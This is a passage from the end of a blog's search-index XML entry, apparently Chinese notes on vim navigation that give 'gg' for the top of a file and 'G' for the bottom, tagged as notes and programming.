<li>文件头部：gg</li>
<li>文件尾部：G<span id="more"></span></li>
</ul>
</li>
<li><p>  待续…</p>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
</search>
